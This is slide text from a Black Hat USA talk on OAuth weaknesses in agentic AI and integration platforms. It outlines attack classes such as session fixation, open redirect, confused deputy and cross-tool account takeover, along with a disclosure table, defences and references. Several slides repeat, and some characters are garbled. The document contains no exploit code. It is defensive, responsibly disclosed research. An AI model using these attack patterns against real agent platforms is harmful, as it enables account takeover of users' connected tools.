###### **_Token Manager_**

Agent

**_User_**

**Session Fixation** ① **Cross-user** **_Improper Fix_** ② **Cross-user Open Redirect**

#BHUSA  @BlackHatEvents

48

## Slide 112

### Summary: Attacks in Connection-based OAuth

**_Tool_**

###### **_ConnecCon = <user, agent, tool>_**

**_Token Manager_**

Agent

- ③ **Cross-agent Confused Deputy**

- Client ID Confusion

**_User_**

④ **Cross-agent Cross-tool Confused Deputy**

- Cross-agent **COAT** (Cross-app/tool OAuth Account Takeover)

**Session Fixation** ① **Cross-user** **_Improper Fix_** ② **Cross-user Open Redirect**

#BHUSA  @BlackHatEvents

48

## Slide 113

### Summary: Attacks in Connection-based OAuth

**_Tool_**

###### **_ConnecCon = <user, agent, tool>_**

Token Manager
Agent
Confused Deputy
User
④ Cross-agent Cross-tool
• Cross-agent
Session Fixation
① Cross-user (Cross-app/tool OAuth
Improper Fix Account Takeover)

- ③ **Cross-agent Confused Deputy** • Client ID Confusion

- ④ **Cross-agent Cross-tool Confused Deputy** • Cross-agent **COAT** (Cross-app/tool OAuth Account Takeover)

② **Cross-user Open Redirect**

**"Back to the Future":**

**Classic web security / OAuth threats** **_remanifest_** themselves in Connection-based OAuth Architectures

#BHUSA  @BlackHatEvents

48

## Slide 114

### Summary: Attacks in Connection-based OAuth

**_Tool_**

###### **_ConnecCon = <user, agent, tool>_**

**_Token Manager_**

Agent

③ **Cross-agent Confused Deputy**

• Client ID Confusion

**_User_**

④ **Cross-agent Cross-tool Confused Deputy**

- Cross-agent **COAT** (Cross-app/tool OAuth Account Takeover)

**Session Fixation** ① **Cross-user** **_Improper Fix_**

② **Cross-user Open Redirect**

**"Back to the Future":**

**Classic web security / OAuth threats** **_remanifest_** themselves in Connection-based OAuth Architectures

**Security Impact:** Tool Account Takeovers w/o explicit consent

#BHUSA  @BlackHatEvents

48

## Slide 115

### Summary: Attacks in Connection-based OAuth

**_Tool_**

###### **_ConnecCon = <user, agent, tool>_**

Token Manager
Agent
User

#BHUSA  @BlackHatEvents

49

## Slide 116

### Summary: Attacks in Connection-based OAuth

Tool
ConnecCon = <user, agent, tool>
Token Manager
Agent
User
Post-Redirect
user
❌
session
Channel
Session Fixation
① Cross-user
The various  channels  for publishing agents  complicates Session Fixation Defense

###### **_ConnecCon = <user, agent, tool>_**

#BHUSA  @BlackHatEvents

49

## Slide 117

#### Real-world Impact: Make the world a better place

Cross-tool
Cross-user Cross-agent
(w/ Cross-agent Impact)
7 5
2
Confused Deputy
Vendor Session Fixation Open Redirect
3 Client ID Confusion 6 Cross-agent COAT
Credential Manager
Vuln, now Fixed
(e.g., Power Automate, Secure* Secure Vuln, now Fixed
(w/ XSS, postMessage)
Azure Logic Apps)
Bot Framework
Token Service
Secure Secure Secure Vuln, now Fixed
(Azure AI Bot Service,
Copilot Studio)
Popular Tool-calling
Engine  (#1 Trending  Vuln N/A Vuln Vuln
Repo for a day)
Vuln, now Fixed N/A Vuln, now Fixed ?
Vuln, now Fixed N/A ? Vuln, now Fixed
Top Agentic AI Toolset
Vuln, Fixing N/A Vuln Vuln
(w/ 25K #Stars)
Vuln N/A Secure Vuln

- Discovered **16** Vulnerable Instances; Followed Responsible Disclosure common practices

- • In-depth Discussions/Meetings w/ Microsoft, Arcade, & ByteDance Coze's Security Team

- • Appreciate vendors' coordination & responsible fixes !

***** Published Security Advisory in 2018:

<u>https://github.com/Azure/azure-tokens/blob/master/docs/phishing-attack-vulnerability.md</u>

#BHUSA  @BlackHatEvents

50

## Slide 118

#### Taxonomy of Attacks

**# Vendors**

**7 Agentic AI or Integration Platforms**

**Security Impact**

_Tool Account Takeover_

###### **# Vulnerable Instances**

3 New A6ack Scenarios 4 Types of
"Back to the Future" A6acks
5 Session Fixation
…
7 Cross-user
A  malicious user  of a benign agent
targeting a benign user
2 Open Redirect
of the same agent
Microsoft Azure
Power Apps Logic Apps
9 Cross-agent 3 Client ID Confusion
A  malicious agent … Confused
targeting a benign agent
Deputy
6 COAT  (Cross-tool OAuth
Account Takeover)
6 Cross-tool
A  malicious tool Microsoft …
Copilot Studio
targeting a benign tool

**Defense**

Enforce user **_initiates_** OAuth == user **_completes_** OAuth (e.g., Post-Redirect Pattern for same user verification)

Strictly verify post-redirect URL Per-Agent Client ID

Globally Unique (per-Agent per-Tool) redirect URL

Classic Web Attacks which had been carefully addressed by OAuth standards have now **_remanifested_** due to the emerging, proprietary, yet-increasingly popular OAuth-as-a-Service Architectures in Agentic AI and Integration Platforms !

#BHUSA  @BlackHatEvents

51

## Slide 119

## Key Takeaways

###### **OAuth-as-a-Service: Convenience with Hidden Risks**

- OAuth-as-a-Service makes AI Agent development easier, but it could reintroduce classic vulnerabili;es when the proprietary "OAuth connec;on" comes into play.

- You may trust your agent, but the behind-the-scenes Token Manager might be a third-party you don't recognize, and poten;ally vulnerable.

- Agents may _unknowingly_ expose users to impersona;on & unauthorized access.

###### **Ac9on Required**

- **Agent Developers** : Review your OAuth stack. Are you relying on an insecure architecture?

- **OAuth-as-a-Service Providers** : Fix the problems **ASAP** !

#BHUSA  @BlackHatEvents

52

## Slide 120

## References

- **RFC9700 - OAuth Security Best Current Practice:** <u>https://datatracker.ietf.org/doc/rfc9700</u>

- **Session Fixation in Cross-device Scenario:** <u>https://danielfett.de/2025/03/10/cross-device-session-fixation</u>

- **Security Analysis of Brokered Single Sign-On:**

T. Innocenti, L. Jannett, C. Mainka, V. Mladenov and E. Kirda, ""Only as Strong as the Weakest Link": On the Security of Brokered Single Sign-On on the Web," in 2025 IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 2025, pp. 24-24, doi: 10.1109/SP61157.2025.00024.

- **Cross-window Communication Attack in Single Sign-On:**

Louis Jannett, Vladislav Mladenov, Christian Mainka, and Jörg Schwenk. 2022. DISTINCT: Identity Theft using In-Browser Communications in Dual-Window Single Sign-On. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (CCS '22). Association for Computing Machinery, New York, NY, USA, 1553–1567. https://doi.org/10.1145/3548606.3560692

#BHUSA  @BlackHatEvents

53

## Slide 121

## References: Our previous work

- **[Black Hat USA '24]** Kaixuan Luo, Xianbo Wang, Adonis Fung, Julien Lecomte, and Wing Cheong Lau. "One Hack to Rule Them All: Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT, & LLM Services." Black Hat USA Briefings, 2024. <u>https://www.youtube.com/watch?v=qrHEBElig3c</u>

<u>https://www.blackhat.com/us-24/briefings/schedule/#one-hack-to-rule-them-all-pervasive-accounttakeovers-in-integration-platforms-for-workflow-automation-virtual-voice-assistant-iot-38-llm-services-38994</u>

- **[USENIX Security '25]** Kaixuan Luo, Xianbo Wang, Pui Ho Adonis Fung, Wing Cheong Lau, and Julien Lecomte. "Universal Cross-app Attacks: Exploiting and Securing OAuth 2.0 in Integration Platforms." 34th USENIX Security Symposium (USENIX Security 25), 2025. <u>https://www.usenix.org/conference/usenixsecurity25/presentation/luo-kaixuan</u>

- **[IETF Draft]** Tim Würtele, Pedram Hosseyni, Kaixuan Luo, and Adonis Fung. "Updates to OAuth 2.0 Security Best Current Practice." Internet-Draft draft-wuertele-oauth-security-topics-update-01, Internet Engineering Task Force, June 2025. Work in Progress. <u>https://datatracker.ietf.org/doc/draft-wuertele-oauth-security-topics-update</u>

#BHUSA  @BlackHatEvents

54

## Slide 122

Back to the Future: Hacking and Securing Connection-based OAuth Architectures in Agentic AI and Integration Platforms

**<u>Kaixuan Luo</u>**<sup>**1**</sup> , Xianbo Wang<sup>**1**</sup> , Adonis Fung<sup>**2**</sup> , Yanxiang Bi<sup>**1**</sup> , **<u>Wing Cheong Lau1</u>** 1 The Chinese University of Hong Kong, 2 Samsung Research America

#BHUSA  @BlackHatEvents

55
